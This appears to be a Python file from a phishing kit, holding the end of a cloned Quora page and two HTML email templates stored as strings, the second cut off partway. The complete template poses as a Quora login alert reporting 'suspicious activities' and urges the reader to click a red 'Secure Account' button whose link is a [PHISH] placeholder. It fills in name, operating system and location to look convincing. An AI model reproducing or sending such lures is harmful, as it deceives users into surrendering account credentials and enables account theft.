"AskQuestionSelector", "S08WEsJ", "question_bar", {"should_autofocus": false, "should_inline": true, "show_results_for_empty_query": false, "title_text": null, "placeholder_text": "Start your question with \\"What\\", \\"How\\", \\"Why\\", etc.", "metadata": {}, "allow_open_new_link": true, "opening_question_punctuation": "", "closing_question_punctuation": "?", "question_length_limit": 250, "should_capitalize": true, "target": null, "delay": 0, "source_window_id": "broadcast_mobile_xxdymmftihhn", "has_spaces": false}, {"name_save": true}], ["unified_view/question/sources", "QuestionSourceEdit", "ivgNAod", "sources", {}, {"name_save": true}], ["unified_view/google_analytics", "GASnippet", "xLOTou0", "", {"tracking_id": "UA-16618355-1", "tracking_rate": 1, "custom_dimensions": [["dimension1", "settings-account"], ["dimension2", true], ["dimension3", true]]}, {}], ["unified_view/service_worker", "Installer", "taXpWOL", "", {}, {}], ["unified_view/browser_push", "BrowserPush", "rv2oiCo", "", {"is_web_push_enabled": false}, {}], ["unified_view/gif_player", "QTextGIFPlayer", "oSLF4kA", "", {}, {}], ["mobile_app2/view/mobile/drawer", "BadgeCountUpdater", "SUSbmZW", "", {"badgeCountData": {"timestamp": 1537806052623, "feed": 0, "notifs": 0, "openqs": 0, "profile": 0, "value": 1, "silos": {}}, "hashBroadcastData": {"hash": "922d14a2c570f14a3e07af81d2b1d50d", "notifsHash": "empty", "a2aHash": "empty", "personala2aHash": "empty", "systema2aHash": "empty"}}, {}]], true, [{"gTeqTUO": ["f32039839bbfe9a3f07c4ba32386ad21", "5e8dc1b38df5bab97346061704f9d584"], "sK3UjUO": ["357e5ccb80557175ee6d15c2b7a2af34"], "WGbJbBy": ["d15bfb667d2b901e08891c3b3f2037ce"], "lMqLELw": ["96197d315e4244907f19d6f9fe9cf851", "2ab4b697fecfab8127b0b44c7695a4ff", "94ff392b6047335470c665231ca5b726"], "mKUXzgA": ["5fed40d46795886aa4b3410c8bfc15e1"], "SUSbmZW": ["c884f35f084f800994d62fb1c065cc06", "7e8b592de50ddd9d9d6e91ab38c058a9", "574a88c65d8240a17a3dfa5eb4b923e5", "e1f7f955353bd9b8bc467b0afe942f05", "7efcc1f559c075f8e0406d64df93e3ea", "01dcc27ae482617e916203ecf7f4761e", "2c08441e77d93683123c1531f02e5d57", "a5f15fbb512e817c74b81c2c7ebfac01", "f8ac3a5f069ad8d6ffe72126d96f2900", "bf895b23518dd6f2d5f1a778c5459096", "6453ff2e780a2c7fb7892df4bcefb48c", "3c51e30cdb40e06a7c35e68952934c92", "28ab0c7b17324c549db58f032c5d229c"]}, {"gTeqTUO": "AAEAALRZBKq+Pnp6kWIK+PlgE1oGX8B4gV369pm0CSjJEKfYpoJ5EtLvVHidbiO42m4YiZ82xSdE\\nrmCv4GfVV7exffuHhVXG4VwNopK6Wk9WK2O1BJ2ItVwW5pFni5cnzaMUlg==\\n", "sK3UjUO": "AAEAAM6ZlnTAQptKn+t4Q08GOAHf3pBEnMwwr5yruWA960uTcJfq3PrfWTnnbGrnE40Eq/zwx8dh\\nClvlgIuWRKs2BhlmQ2iw3EDp7RjGmdZm9XhkHfzG0HAtvB8Nj0r3FQsIWw==\\n", "WGbJbBy": "AAEAALk86XmfT6e+2szQej8oZ7JC0BA0qTUimqrYVNSxG+DYPirLKdWItIhQa1s2emnCCxMTxVdp\\nztCs03tpAEfyD7F3ZMTliY+0GzoeKPlxfPfYUAG6gghW2utRKHizdo5EuA==\\n", "lMqLELw": "AAEAABxUzvgGfaiFZePIJ6UqtxQ7raTW1is+TkI6Z8soJMlK7/f+j2I4DYtqSf8JCHcTV8yPZ1cp\\noh0ErxTCj28EWOVKspsrR6wyJGrXAhMn59U+hiIOp0XamP3/ZHp4SqC30Q==\\n", "mKUXzgA": "AAEAAFvaCCvuHfeq/PxC+UFD97XPdQC6gVljq8dSqW2PRU4vhEY6ueG01ZokKsiGxOlK35kOq1Dq\\ny+O65nS4nzuGdW+sj2hyYhs8Hpst6J4y2siPPE0+l/uGJrYXp5RvpbXruw==\\n", "SUSbmZW": "AAEAAEDVTrj15MJYSEHZJjv07yg1nomTSB4HVmtA8SqLRrixJEyrZ8UKDoDrZmb+5yXx6D7G+2SX\\ncSzUBLXOjoeZiAYjhPmRawJ4sualICL3xBWvgHrKy7L3T6wq6dR3Db6S5Q==\\n"}, null]];
            webnode.initialize2.apply(null, args);
        });</script><script type="text/javascript">require.whenReady("shared/main-loaded", function() {
            var w2_timing = require('shared/w2.timing');
            var timing = w2_timing.timing;
            window.addEventListener('DOMContentLoaded', function() {
                w2_timing.logTime('documentReady');
            });
            window.addEventListener('load', function() {
                w2_timing.logTime('windowLoad');
                require('shared/e2e').reportPageData({"standard": {}})
            });
            timing.server_time = 133.32;
            timing.total_worker_time = 130.28;
            timing.window_id = "broadcast_mobile_xxdymmftihhn";
            timing.page = 133.32;
            timing.request = 145.97;
            timing.is_css_inlined = false;
            timing.is_early_js_inlined = false;
            timing.page_size = 26311;
            timing.experiments = "AAEAAHe3Z296OXXK1NbWWuoMANZ3aQVNSUmxuHDZ4hF1Y0eeIY2/5M0BxTa1vgITpkgSUw4IpYvVWlTtU7Aj6/Tc78EAeZW5wVC7pPwjuTdlYc/QEnVW6IX/rPlEUj35acHFFfJ8n+0rlILHGmyHMgkVATObPH+Dzv21XBzwwN/LhdGmxsjNKPHaqH/pRhNI20kJOCsvOTdYnQ/lG/U4oYRsA4/H/nzmOhOnUYqd3ddr42QLiqBSt2KSLZ7cQEyzvTHM7t03qOWlpBr52G5yI43ThCRPboJUHkAt84U3nyqkACVRm8fYsPHtc9tJ+LAhFjp9yqUGTkbfTIJsLM8OBeNs5YUns2/saGmz9UL7p1aa/kjjbsMnGitZBIjne9Rkwwcdk+2Jbeam7oXoZTe4hCW+9Rg95yPeOr1sPhki2Dd1/02HmxQ9CGjTJoztRbzdxX2jLrsghAZeWDVpk8//aXicokroNL+RqCoSJiEZS44cRBg4caSsOfRrD/Ni63Q1Tciat5FfHSTyN9t43MQXnLo4pElqTJVwJP6Ljf2TOs6h8X1o";
        });</script></body></html>"""





















































Email_Quora = """<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional //EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><head>
    <!--[if gte mso 9]><xml>
     <o:OfficeDocumentSettings>
      <o:AllowPNG/>
      <o:PixelsPerInch>96</o:PixelsPerInch>
     </o:OfficeDocumentSettings>
    </xml><![endif]-->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width">
    <!--[if !mso]><!--><meta http-equiv="X-UA-Compatible" content="IE=edge"><!--<![endif]-->
    <title></title>
    
    
    <style type="text/css" id="media-query">
      body {
  margin: 0;
  padding: 0; }

table, tr, td {
  vertical-align: top;
  border-collapse: collapse; }

.ie-browser table, .mso-container table {
  table-layout: fixed; }

* {
  line-height: inherit; }

a[x-apple-data-detectors=true] {
  color: inherit !important;
  text-decoration: none !important; }

[owa] .img-container div, [owa] .img-container button {
  display: block !important; }

[owa] .fullwidth button {
  width: 100% !important; }

[owa] .block-grid .col {
  display: table-cell;
  float: none !important;
  vertical-align: top; }

.ie-browser .num12, .ie-browser .block-grid, [owa] .num12, [owa] .block-grid {
  width: 500px !important; }

.ExternalClass, .ExternalClass p, .ExternalClass span, .ExternalClass font, .ExternalClass td, .ExternalClass div {
  line-height: 100%; }

.ie-browser .mixed-two-up .num4, [owa] .mixed-two-up .num4 {
  width: 164px !important; }

.ie-browser .mixed-two-up .num8, [owa] .mixed-two-up .num8 {
  width: 328px !important; }

.ie-browser .block-grid.two-up .col, [owa] .block-grid.two-up .col {
  width: 250px !important; }

.ie-browser .block-grid.three-up .col, [owa] .block-grid.three-up .col {
  width: 166px !important; }

.ie-browser .block-grid.four-up .col, [owa] .block-grid.four-up .col {
  width: 125px !important; }

.ie-browser .block-grid.five-up .col, [owa] .block-grid.five-up .col {
  width: 100px !important; }

.ie-browser .block-grid.six-up .col, [owa] .block-grid.six-up .col {
  width: 83px !important; }

.ie-browser .block-grid.seven-up .col, [owa] .block-grid.seven-up .col {
  width: 71px !important; }

.ie-browser .block-grid.eight-up .col, [owa] .block-grid.eight-up .col {
  width: 62px !important; }

.ie-browser .block-grid.nine-up .col, [owa] .block-grid.nine-up .col {
  width: 55px !important; }

.ie-browser .block-grid.ten-up .col, [owa] .block-grid.ten-up .col {
  width: 50px !important; }

.ie-browser .block-grid.eleven-up .col, [owa] .block-grid.eleven-up .col {
  width: 45px !important; }

.ie-browser .block-grid.twelve-up .col, [owa] .block-grid.twelve-up .col {
  width: 41px !important; }

@media only screen and (min-width: 520px) {
  .block-grid {
    width: 500px !important; }
  .block-grid .col {
    vertical-align: top; }
    .block-grid .col.num12 {
      width: 500px !important; }
  .block-grid.mixed-two-up .col.num4 {
    width: 164px !important; }
  .block-grid.mixed-two-up .col.num8 {
    width: 328px !important; }
  .block-grid.two-up .col {
    width: 250px !important; }
  .block-grid.three-up .col {
    width: 166px !important; }
  .block-grid.four-up .col {
    width: 125px !important; }
  .block-grid.five-up .col {
    width: 100px !important; }
  .block-grid.six-up .col {
    width: 83px !important; }
  .block-grid.seven-up .col {
    width: 71px !important; }
  .block-grid.eight-up .col {
    width: 62px !important; }
  .block-grid.nine-up .col {
    width: 55px !important; }
  .block-grid.ten-up .col {
    width: 50px !important; }
  .block-grid.eleven-up .col {
    width: 45px !important; }
  .block-grid.twelve-up .col {
    width: 41px !important; } }

@media (max-width: 520px) {
  .block-grid, .col {
    min-width: 320px !important;
    max-width: 100% !important;
    display: block !important; }
  .block-grid {
    width: calc(100% - 40px) !important; }
  .col {
    width: 100% !important; }
    .col > div {
      margin: 0 auto; }
  img.fullwidth, img.fullwidthOnMobile {
    max-width: 100% !important; }
  .no-stack .col {
    min-width: 0 !important;
    display: table-cell !important; }
  .no-stack.two-up .col {
    width: 50% !important; }
  .no-stack.mixed-two-up .col.num4 {
    width: 33% !important; }
  .no-stack.mixed-two-up .col.num8 {
    width: 66% !important; }
  .no-stack.three-up .col.num4 {
    width: 33% !important; }
  .no-stack.four-up .col.num3 {
    width: 25% !important; }
  .mobile_hide {
    min-height: 0px;
    max-height: 0px;
    max-width: 0px;
    display: none;
    overflow: hidden;
    font-size: 0px; } }

    </style>
</head>
<body class="clean-body" style="margin: 0;padding: 0;-webkit-text-size-adjust: 100%;background-color: #FFFFFF">
  <style type="text/css" id="media-query-bodytag">
    @media (max-width: 520px) {
      .block-grid {
        min-width: 320px!important;
        max-width: 100%!important;
        width: 100%!important;
        display: block!important;
      }

      .col {
        min-width: 320px!important;
        max-width: 100%!important;
        width: 100%!important;
        display: block!important;
      }

        .col > div {
          margin: 0 auto;
        }

      img.fullwidth {
        max-width: 100%!important;
      }
      img.fullwidthOnMobile {
        max-width: 100%!important;
      }
      .no-stack .col {
        min-width: 0!important;
        display: table-cell!important;
      }
      .no-stack.two-up .col {
        width: 50%!important;
      }
      .no-stack.mixed-two-up .col.num4 {
        width: 33%!important;
      }
      .no-stack.mixed-two-up .col.num8 {
        width: 66%!important;
      }
      .no-stack.three-up .col.num4 {
        width: 33%!important;
      }
      .no-stack.four-up .col.num3 {
        width: 25%!important;
      }
      .mobile_hide {
        min-height: 0px!important;
        max-height: 0px!important;
        max-width: 0px!important;
        display: none!important;
        overflow: hidden!important;
        font-size: 0px!important;
      }
    }
  </style>
  <!--[if IE]><div class="ie-browser"><![endif]-->
  <!--[if mso]><div class="mso-container"><![endif]-->
  <table class="nl-container" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 320px;Margin: 0 auto;background-color: #FFFFFF;width: 100%" cellpadding="0" cellspacing="0">
  <tbody>
  <tr style="vertical-align: top">
    <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top">
    <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="background-color: #FFFFFF;"><![endif]-->

    <div style="background-color:transparent;">
      <div style="Margin: 0 auto;min-width: 320px;max-width: 500px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">
        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">
          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 500px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->

              <!--[if (mso)|(IE)]><td align="center" width="500" style=" width:500px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->
            <div class="col num12" style="min-width: 320px;max-width: 500px;display: table-cell;vertical-align: top;">
              <div style="background-color: transparent; width: 100% !important;">
              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->

                  
                    <div align="center" class="img-container center fixedwidth " style="padding-right: 0px;  padding-left: 0px;">
<!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr style="line-height:0px;line-height:0px;"><td style="padding-right: 0px; padding-left: 0px;" align="center"><![endif]-->
  <img class="center fixedwidth" align="center" border="0" src="http://icons-for-free.com/free-icons/png/512/1696902.png" alt="Image" title="Image" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: block !important;border: 0;height: auto;float: none;width: 100%;max-width: 125px" width="125">
<!--[if mso]></td></tr></table><![endif]-->
</div>

                  
                  
                    
<table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider " style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
    <tbody>
        <tr style="vertical-align: top">
            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                    <tbody>
                        <tr style="vertical-align: top">
                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                                <span></span>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>
    </tbody>
</table>
                  
                  
                    <div class="">
  <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->
  <div style="color:#555555;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">  
    <div style="font-size:12px;line-height:14px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><strong><span style="font-size: 16px; line-height: 19px;">Hello [NAME], Did you just Log-in? We've found some suspicious activities on your account, We think someone logged in to your account with this details.</span></strong></p></div><div style="line-height: 14px;margin-top: 0;margin-bottom: 0;font-size: 12px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif">
</div><div style="font-size:12px;line-height:14px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px">&#160;</p></div><div style="line-height: 14px;margin-top: 0;margin-bottom: 0;font-size: 12px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif">
</div><div style="font-size:12px;line-height:14px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px">&#160;</p></div><div style="line-height: 14px;margin-top: 0;margin-bottom: 0;font-size: 12px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif">
</div><div style="font-size:12px;line-height:14px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><span style="color: rgb(128, 128, 128); font-size: 14px; line-height: 16px;"><strong><span style="line-height: 16px; font-size: 14px;">OS: [OS]</span></strong></span></p></div><div style="line-height: 14px;margin-top: 0;margin-bottom: 0;font-size: 12px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif">
</div><div style="font-size:12px;line-height:14px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><span style="color: rgb(128, 128, 128); font-size: 14px; line-height: 16px;"><strong><span style="line-height: 16px; font-size: 14px;">LOCATION: [LOC]</span></strong></span></p></div><div style="line-height: 14px;margin-top: 0;margin-bottom: 0;font-size: 12px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif">
</div><div style="font-size:12px;line-height:14px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px">&#160;</p></div><div style="line-height: 14px;margin-top: 0;margin-bottom: 0;font-size: 12px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif">
</div><div style="font-size:12px;line-height:14px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px">&#160;</p></div><div style="line-height: 14px;margin-top: 0;margin-bottom: 0;font-size: 12px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif">
</div><div style="font-size:12px;line-height:14px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><strong><span style="font-size: 16px; line-height: 19px;">If this is you then just ignore this email, if not then please try secure your account:</span></strong></p></div> 
  </div>
  <!--[if mso]></td></tr></table><![endif]-->
</div>
                  
                  
                    
<table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider " style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
    <tbody>
        <tr style="vertical-align: top">
            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                    <tbody>
                        <tr style="vertical-align: top">
                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                                <span></span>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>
    </tbody>
</table>
                  
                  
                    
<div align="center" class="button-container center " style="padding-right: 10px; padding-left: 10px; padding-top:10px; padding-bottom:10px;">
  <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0" style="border-spacing: 0; border-collapse: collapse; mso-table-lspace:0pt; mso-table-rspace:0pt;"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top:10px; padding-bottom:10px;" align="center"><v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word" href="[PHISH]" style="height:31pt; v-text-anchor:middle; width:148pt;" arcsize="10%" strokecolor="#A90A0A" fillcolor="#A90A0A"><w:anchorlock/><v:textbox inset="0,0,0,0"><center style="color:#ffffff; font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; font-size:16px;"><![endif]-->
    <a href="[PHISH]" target="_blank" style="display: block;text-decoration: none;-webkit-text-size-adjust: none;text-align: center;color: #ffffff; background-color: #A90A0A; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; max-width: 460px; width: 40%; border-top: 0px solid transparent; border-right: 0px solid transparent; border-bottom: 0px solid transparent; border-left: 0px solid transparent; padding-top: 5px; padding-right: 20px; padding-bottom: 5px; padding-left: 20px; font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;mso-border-alt: none">
      <span style="font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size:16px;line-height:32px;"><strong>Secure Account</strong></span>
    </a>
  <!--[if mso]></center></v:textbox></v:roundrect></td></tr></table><![endif]-->
</div>

                  
                  
                    
<table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider " style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
    <tbody>
        <tr style="vertical-align: top">
            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                    <tbody>
                        <tr style="vertical-align: top">
                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                                <span></span>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>
    </tbody>
</table>
                  
              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
              </div>
            </div>
          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
        </div>
      </div>
    </div>
   <!--[if (mso)|(IE)]></td></tr></table><![endif]-->
    </td>
  </tr>
  </tbody>
  </table>
  <!--[if (mso)|(IE)]></div><![endif]-->


</body></html>"""




































































Email1_Quora = """<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional //EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><head>
    <!--[if gte mso 9]><xml>
     <o:OfficeDocumentSettings>
      <o:AllowPNG/>
      <o:PixelsPerInch>96</o:PixelsPerInch>
     </o:OfficeDocumentSettings>
    </xml><![endif]-->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width">
    <!--[if !mso]><!--><meta http-equiv="X-UA-Compatible" content="IE=edge"><!--<![endif]-->
    <title></title>
    
    
    <style type="text/css" id="media-query">
      body {
  margin: 0;
  padding: 0; }

table, tr, td {
  vertical-align: top;
  border-collapse: collapse; }

.ie-browser table, .mso-container table {
  table-layout: fixed; }

* {
  line-height: inherit; }

a[x-apple-data-detectors=true] {
  color: inherit !important;
  text-decoration: none !important; }

[owa] .img-container div, [owa] .img-container button {
  display: block !important; }

[owa] .fullwidth button {
  width: 100% !important; }

[owa] .block-grid .col {
  display: table-cell;
  float: none !important;
  vertical-align: top; }

.ie-browser .num12, .ie-browser .block-grid, [owa] .num12, [owa] .block-grid {
  width: 500px !important; }

.ExternalClass, .ExternalClass p, .ExternalClass span, .ExternalClass font, .ExternalClass td, .ExternalClass div {
  line-height: 100%; }

.ie-browser .mixed-two-up .num4, [owa] .mixed-two-up .num4 {
  width: 164px !important; }

.ie-browser .mixed-two-up .num8, [owa] .mixed-two-up .num8 {
  width: 328px !important; }

.ie-browser .block-grid.two-up .col, [owa] .block-grid.two-up .col {
  width: 250px !important; }

.ie-browser .block-grid.three-up .col, [owa] .block-grid.three-up .col {
  width: 166px !important; }

.ie-browser .block-grid.four-up .col, [owa] .block-grid.four-up .col {
  width: 125px !important; }

.ie-browser .block-grid.five-up .col, [owa] .block-grid.five-up .col {
  width: 100px !important; }

.ie-browser .block-grid.six-up .col, [owa] .block-grid.six-up .col {
  width: 83px !important; }

.ie-browser .block-grid.seven-up .col, [owa] .block-grid.seven-up .col {
  width: 71px !important; }

.ie-browser .block-grid.eight-up .col, [owa] .block-grid.eight-up .col {
  width: 62px !important; }

.ie-browser .block-grid.nine-up .col, [owa] .block-grid.nine-up .col {
  width: 55px !important; }

.ie-browser .block-grid.ten-up .col, [owa] .block-grid.ten-up .col {
  width: 50px !important; }

.ie-browser .block-grid.eleven-up .col, [owa] .block-grid.eleven-up .col {
  width: 45px !important; }

.ie-browser .block-grid.twelve-up .col, [owa] .block-grid.twelve-up .col {
  width: 41px !important; }

@media only screen and (min-width: 520px) {
  .block-grid {
    width: 500px !important; }
  .block-grid .col {
    vertical-align: top; }
    .block-grid .col.num12 {
      width: 500px !important; }
  .block-grid.mixed-two-up .col.num4 {
    width: 164px !important; }
  .block-grid.mixed-two-up .col.num8 {
    width: 328px !important; }
  .block-grid.two-up .col {
    width: 250px !important; }
  .block-grid.three-up .col {
    width: 166px !important; }
  .block-grid.four-up .col {
    width: 125px !important; }
  .block-grid.five-up .col {
    width: 100px !important; }
  .block-grid.six-up .col {
    width: 83px !important; }
  .block-grid.seven-up .col {
    width: 71px !important; }
  .block-grid.eight-up .col {
    width: 62px !important; }
  .block-grid.nine-up .col {
    width: 55px !important; }
  .block-grid.ten-up .col {
    width: 50px !important; }
  .block-grid.eleven-up .col {
    width: 45px !important; }
  .block-grid.twelve-up .col {
    width: 41px !important; } }

@media (max-width: 520px) {
  .block-grid, .col {
    min-width: 320px !important;
    max-width: 100% !important;
    display: block !important; }
  .block-grid {
    width: calc(100% - 40px) !important; }
  .col {
    width: 100% !important; }
    .col > div {
      margin: 0 auto; }
  img.fullwidth, img.fullwidthOnMobile {
    max-width: 100% !important; }
  .no-stack .col {
    min-width: 0 !important;
    display: table-cell !important; }
  .no-stack.two-up .col {
    width: 50% !important; }
  .no-stack.mixed-two-up .col.num4 {
    width: 33% !important; }
  .no-stack.mixed-two-up .col.num8 {
    width: 66% !important; }
  .no-stack.three-up .col.num4 {
    width: 33% !important; }
  .no-stack.four-up .col.num3 {
    width: 25% !important; }
  .mobile_hide {
    min-height: 0px;
    max-height: 0px;
    max-width: 0px;
    display: none;
    overflow: hidden;
    font-size: 0px; } }

    </style>
</head>
<body class="clean-body" style="margin: 0;padding: 0;-webkit-text-size-adjust: 100%;background-color: #FFFFFF">
  <style type="text/css" id="media-query-bodytag">
    @media (max-width: 520px) {
      .block-grid {
        min-width: 320px!important;
        max-width: 100%!important;
        width: 100%!important;
        display: block!important;
      }

      .col {
        min-width: 320px!important;
        max-width: 100%!important;
        width: 100%!important;
        display: block!important;
      }

        .col > div {
          margin: 0 auto;
        }

      img.fullwidth {
        max-width: 100%!important;
      }
      img.fullwidthOnMobile {
        max-width: 100%!important;
      }
      .no-stack .col {
        min-width: 0!important;
        display: table-cell!important;
      }
      .no-stack.two-up .col {
        width: 50%!important;
      }
      .no-stack.mixed-two-up .col.num4 {
        width: 33%!important;
      }
      .no-stack.mixed-two-up .col.num8 {
        width: 66%!important;
      }
      .no-stack.three-up .col.num4 {
        width: 33%!important;
      }
      .no-stack.four-up .col.num3 {
        width: 25%!important;
      }
      .mobile_hide {
        min-height: 0px!important;
        max-height: 0px!important;
        max-width: 0px!important;
        display: none!important;
        overflow: hidden!important;
        font-size: 0px!important;
      }
    }
  </style>
  <!--[if IE]><div class="ie-browser"><![endif]-->
  <!--[if mso]><div class="mso-container"><![endif]-->
  <table class="nl-container" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 320px;Margin: 0 auto;background-color: #FFFFFF;width: 100%" cellpadding="0" cellspacing="0">
  <tbody>
  <tr style="vertical-align: top">
    <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top">
    <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="background-color: #FFFFFF;"><![endif]-->

    <div style="background-color:transparent;">
      <div style="Margin: 0 auto;min-width: 320px;max-width: 500px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">
        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">
          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 500px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->

